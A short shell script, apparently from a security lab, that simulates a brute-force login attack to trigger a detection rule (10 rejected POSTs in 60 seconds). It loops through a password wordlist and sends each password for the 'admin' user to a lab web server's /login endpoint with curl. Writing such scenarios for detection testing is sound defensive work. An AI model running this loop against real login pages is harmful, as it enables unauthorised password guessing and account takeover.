#!/bin/sh
# web-login-brute-force: password guessing against /login (always 401).
# Rule threshold: 10 rejected POSTs in 60s.
set -eu
. /lab/scenarios/web-common.sh
echo "SCENARIO_START web-login-brute-force $(date -u +%Y-%m-%dT%H:%M:%SZ)"
while read -r pw; do
    curl -s -o /dev/null -X POST -d "username=admin&password=$pw" "http://$WEB/login"
done < /lab/wordlist-passwords.txt
echo "SCENARIO_END web-login-brute-force"
